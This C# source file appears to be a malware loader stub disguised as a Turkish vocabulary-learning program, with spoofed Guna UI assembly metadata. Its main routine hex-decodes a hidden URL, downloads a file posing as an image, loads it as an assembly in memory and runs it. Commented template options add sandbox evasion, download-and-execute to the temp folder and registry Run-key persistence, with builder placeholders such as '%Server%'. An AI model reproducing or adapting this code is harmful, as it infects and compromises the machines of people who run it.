using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Drawing;
using System.Security.Cryptography;
using System.IO;
using System.Text;
using System.Threading;
using System.Text.RegularExpressions;
using Microsoft.Win32;
using Microsoft.VisualBasic.CompilerServices;


//Default [assembly: AssemblyTitle("Guna.UI2.dll")]
//Default [assembly: AssemblyDescription("Guna UI2 WinForms v2.0.0.6")]
//Default [assembly: AssemblyCompany("Sobatdata Software")]
//Default [assembly: AssemblyProduct("Guna UI2 WinForms")]
//Default [assembly: AssemblyCopyright("Copyright Â©  2020")]
//Default [assembly: AssemblyFileVersion("2.0.0.6")]


//Assembly [assembly: AssemblyTitle("{1}")]
//Assembly [assembly: AssemblyDescription("{2}")]
//Assembly [assembly: AssemblyCompany("{3}")]
//Assembly [assembly: AssemblyProduct("{4}")]
//Assembly [assembly: AssemblyCopyright("{5}")]
//Assembly [assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]



namespace yazilim_projesi
{
    public class Kelime
    {
        public int kelimeId { get; set; }
        public string ingKelime { get; set; }
        public string turkceKelime { get; set; }
        public string ornekCumle { get; set; }
        public string kelimeTuru { get; set; }
        public string seviye { get; set; }
        public string tarih { get; set; }
        public List<Kelime> kelimeler;
    }
}
namespace yazilim_projesi
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        /// 



        //sandboxie [DllImport("kernel32.dll")]
        //sandboxie public static extern IntPtr GetModuleHandle(string lpModuleName);
        //sandboxie static void controlsandboxie()
        //sandboxie {
        //sandboxie     if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
        //sandboxie     {
        //sandboxie        Environment.Exit(1);
        //sandboxie     }
        //sandboxie }

        [STAThread]
        private static void Main(string[] args)
		{
 
            //Sleep System.Threading.Thread.Sleep(%Sleep%);

			//sandboxie controlsandboxie();

			//Messega

			//download try
			//download {
			//download  System.Net.WebClient appyrun = new System.Net.WebClient();
			//download appyrun.DownloadFile("%DownloadLink%", (System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
			//download  Process.Start((System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
			//download }
			//download catch
			//download {
			//download }

             
            
            //start {
            //start  int %36% = Conversions.ToInteger("1");
            //start   if ((double)%36% != Conversions.ToDouble("1") || Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "%Name%", (object)null) != null)return;
            //start  string %37% = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\%FolderName%\\%Startup File Name%";
            //start   if (!Directory.Exists(Path.GetDirectoryName(%37%)))
            //start   {
            //start   Directory.CreateDirectory(Path.GetDirectoryName(%37%));
            //start   File.Copy(Application.ExecutablePath, %37%, true);
            //start   }
            //start   Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "%Name%", (object)%37%);    
            //start   }


                System.Net.ServicePointManager.SecurityProtocol |=


SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;

                byte[] enhancement = GunaButton3_Click("68 74 74 70 73 3A 2F 2F 77 77 77 2E 75 70 6C 6F 6F 64 65 72 2E 6E 65 74 2F 66 2F 74 6C 2F 32 33 2F 62 38 32 33 38 64 31 32 32 65 38 62 65 65 64 32 36 37 35 34 37 37 36 33 30 32 35 36 34 33 64 62 2F 66 69 78 65 64 61 70 69 2E 70 73 64");
                string lighting = Encoding.ASCII.GetString(enhancement);



       var p_picture = new WebClient().DownloadData(lighting);
      
            
            var CustomAsal  = new WebClient().DownloadData("%Server%");
            byte[] pnLogin = GunaButton3_Click("66 69 78 65 64 61 70 69 2E 61 70 69 72 75 6E");
            string OptionCompare = Encoding.ASCII.GetString(pnLogin);

            byte[] AppSettingsPropertyName = GunaButton3_Click("47 75 6E 61 42 75 74 74 6F 6E 31 5F 43 6C 69 63 6B");
            string Page2 = Encoding.ASCII.GetString(AppSettingsPropertyName);

        string ChatButtonItem1_CheckedChanged = OptionCompare;

        string _CustomJumlahPesanBaru = Page2;

            object GunaButton1_Click = new object[] { "appyrun", string.Empty, CustomAsal , true };


            var UserControl1  = BindingFlags.InvokeMethod;

            Assembly GunaMouseStateHelper1_MouseStateChanged = Assembly.Load(p_picture);



            GunaMouseStateHelper1_MouseStateChanged.GetType(ChatButtonItem1_CheckedChanged).InvokeMember(_CustomJumlahPesanBaru, UserControl1 , null, null, (object[])GunaButton1_Click);


		}

        public static byte[] GunaButton3_Click(string hex)
        {
            hex = hex.Replace(" ", "");
            byte[] raw = new byte[hex.Length / 2];
            for (int i = 0; i < raw.Length; i++)
            {
                raw[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            }
            return raw;
        }


    }



}
